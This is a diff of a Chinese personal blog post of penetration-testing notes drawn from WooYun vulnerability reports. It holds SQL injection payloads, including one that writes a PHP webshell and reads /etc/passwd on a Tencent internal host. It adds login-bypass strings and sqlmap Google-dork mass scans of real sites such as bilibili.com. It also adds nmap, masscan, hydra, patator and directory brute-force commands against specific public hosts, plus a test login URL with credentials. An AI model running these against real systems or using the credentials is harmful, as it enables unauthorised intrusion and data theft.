@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com 正文11-07SQL注入学习腾讯某分站SQL注射-直接绕过WAF https://bugs.shuimugan.com/bug/vi">
+<meta name="description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com ps:最后还是混到了营长 没想到审了这么久一个洞感谢，Art3mis师傅千里送payload。 正文11-07SQL注入学习腾讯某分">
 <meta name="keywords" content="笔记,渗透测试,wooyun">
 <meta property="og:type" content="article">
 <meta property="og:title" content="读乌云漏洞库">
 <meta property="og:url" content="https://legoc.github.io/2018/11/06/读乌云漏洞库/index.html">
 <meta property="og:site_name" content="Mugen">
-<meta property="og:description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com 正文11-07SQL注入学习腾讯某分站SQL注射-直接绕过WAF https://bugs.shuimugan.com/bug/vi">
+<meta property="og:description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com ps:最后还是混到了营长 没想到审了这么久一个洞感谢，Art3mis师傅千里送payload。 正文11-07SQL注入学习腾讯某分">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-10T12:10:44.153Z">
+<meta property="og:updated_time" content="2019-01-12T02:05:08.594Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="读乌云漏洞库">
-<meta name="twitter:description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com 正文11-07SQL注入学习腾讯某分站SQL注射-直接绕过WAF https://bugs.shuimugan.com/bug/vi">
+<meta name="twitter:description" content="前言之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。 安利一个镜像 https://bugs.shuimugan.com ps:最后还是混到了营长 没想到审了这么久一个洞感谢，Art3mis师傅千里送payload。 正文11-07SQL注入学习腾讯某分">
 
 
 
@@ -369,6 +369,7 @@
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。</p>
 <p>安利一个镜像 <a href="https://bugs.shuimugan.com" target="_blank" rel="noopener">https://bugs.shuimugan.com</a></p>
+<p>ps:最后还是混到了营长 没想到审了这么久一个洞感谢，Art3mis师傅千里送payload。</p>
 <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="11-07"><a href="#11-07" class="headerlink" title="11-07"></a>11-07</h2><h3 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h3><p>腾讯某分站SQL注射-直接绕过WAF <a href="https://bugs.shuimugan.com/bug/view?bug_no=90369" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=90369</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://fun.kid.qq.com/funshop/testfunshow/ebookController/update_assets_list?campaignID=0&amp;etclass=0&amp;formatID=50&quot;</span><br><span class="line">formatID 存在注射。</span><br><span class="line">利用双重urlencode 直接绕过 waf 拦截。</span><br></pre></td></tr></table></figure>
 <p>腾讯QQ彩票某处SQL注射-可看到中奖记录 <a href="https://bugs.shuimugan.com/bug/view?bug_no=86707" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=86707</a></p>
@@ -382,6 +383,33 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参数f_uid可注入。MySQL union注入。 </span><br><span class="line">f_channel_name=test&amp;f_uid=-1&apos; OR ascii(mid(user()from(1)for(1)))!=123 AND 1=1 --</span><br></pre></td></tr></table></figure>
 <p>从一个phpinfo到一次半途而废的腾讯内网漫游之旅</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://isux.oa.com/sola/server/showPic.php</span><br><span class="line">user=1&apos; union select 1,&quot;&lt;?php system(&apos;ps aux&apos;)?&gt;&quot;,load_file(&apos;/etc/passwd&apos;),4,5,6,7,8,9,0 into outfile &quot;/data/imgcache/htdocs/sola/public/1k23hj1k22b.php&quot; -- ;</span><br></pre></td></tr></table></figure>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>问了一下带头老哥大师傅，他说他的SQL注入是手注找测试点的，意味着这个细心和耐心是很重要了，自己和玩XSS一样老老实实一个个测吧，看之前大佬们的总结，SQL注入的挖掘重点在于闭合语句。</p>
+<p>盲注的语句找注入点看来是个蛮不错的选择总结几个闭合方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(1,sleep(3),null) --+</span><br><span class="line">or 1=1--+ </span><br><span class="line"></span><br><span class="line">&apos;or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;or 1=1--+ </span><br><span class="line"></span><br><span class="line">)or 1=1--+ </span><br><span class="line"></span><br><span class="line">&apos;)or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;) or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure>
+<p>绕过登入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&apos; or 1=1#</span><br><span class="line">&apos; or 1=1/*</span><br><span class="line">&apos;) or &apos;1&apos;=&apos;1--</span><br><span class="line">&apos;) or (&apos;1&apos;=&apos;1--</span><br></pre></td></tr></table></figure>
+<h3 id="SQLMAP小结"><a href="#SQLMAP小结" class="headerlink" title="SQLMAP小结"></a>SQLMAP小结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--batch 	从不询问用户输入,使用所有默认配置。</span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">-–count    表中数据条数</span><br><span class="line">–start 1 –stop 20 #列出指定字段，列出20 条</span><br></pre></td></tr></table></figure>
+<p>好用的语句例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于google爬虫的sql注入 python sqlmap.py -g &quot;site:bilibili.com inurl:.php?&quot; --batch --random-agent</span><br><span class="line">防止进局子的 python sqlmap.py -u &quot;http://xxxxx/sqli-labs-master/Less-2/?id=1&quot; --count -D &quot;mysql&quot;</span><br></pre></td></tr></table></figure>
+<p>python sqlmap.py -g “site:xinlingshou.cn  inurl:.php?” –batch –random-agent</p>
+<p>python sqlmap.py -u “<a href="http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1&quot;" target="_blank" rel="noopener">http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1&quot;</a> –random-agent</p>
+<p><a href="http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1" target="_blank" rel="noopener">http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ASRC TEST</span><br><span class="line">https://bsstest1.yyzws.com/leaf_manager_web/static/html/login.html?    admin 123456</span><br><span class="line">101.37.224.91</span><br></pre></td></tr></table></figure>
+<p>100.67.56.221</p>
+<h3 id="扫描器总结"><a href="#扫描器总结" class="headerlink" title="扫描器总结"></a>扫描器总结</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16</span><br></pre></td></tr></table></figure>
+<p>-sn    不扫描端口，只ping主机</p>
+<p>-PE   通过ICMP echo判定主机是否存活</p>
+<p>-n     不反向解析IP地址到域名</p>
+<p>–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描</p>
+<p>–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024</p>
+<p>-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml</p>
+<p>一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -v 14.116.140.49</span><br><span class="line">参数：</span><br><span class="line">-sS    TCP SYN扫描    nmap -sS 192.168.1.254   </span><br><span class="line">-P     指定端口扫描   nmap -sS -P 1-65535 192.168.1.254</span><br><span class="line">-V     详细信息       nmap -V -sS 192.168.1.254</span><br></pre></td></tr></table></figure>
+<h4 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan --ports 1-65535 14.116.143.118 --rate 1000 --wait 1</span><br></pre></td></tr></table></figure>
+<h4 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L uname.txt -P pwd.txt 192.168.1.3 telnet</span><br></pre></td></tr></table></figure>
+<h4 id="patator"><a href="#patator" class="headerlink" title="patator"></a>patator</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=passwords.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python patator.py telnet_login host=10.10.12.77 user=FILE=0 0=3389u.txt password=FILE1 1=3389d.txt</span><br></pre></td></tr></table></figure>
+<h4 id="dirs3arch目录爆破"><a href="#dirs3arch目录爆破" class="headerlink" title="dirs3arch目录爆破"></a>dirs3arch目录爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirs3arch.py -u https://gjapplog.uc.cn/ -e php</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -530,7 +558,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -552,7 +580,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">47</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -585,7 +613,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#11-07"><span class="nav-number">2.1.</span> <span class="nav-text">11-07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入学习"><span class="nav-number">2.1.1.</span> <span class="nav-text">SQL注入学习</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#11-07"><span class="nav-number">2.1.</span> <span class="nav-text">11-07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入学习"><span class="nav-number">2.1.1.</span> <span class="nav-text">SQL注入学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.1.2.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP小结"><span class="nav-number">2.1.3.</span> <span class="nav-text">SQLMAP小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描器总结"><span class="nav-number">2.1.4.</span> <span class="nav-text">扫描器总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#masscan"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">masscan</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hydra爆破"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">hydra爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#patator"><span class="nav-number">2.1.4.4.</span> <span class="nav-text">patator</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirs3arch目录爆破"><span class="nav-number">2.1.4.5.</span> <span class="nav-text">dirs3arch目录爆破</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -612,7 +640,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
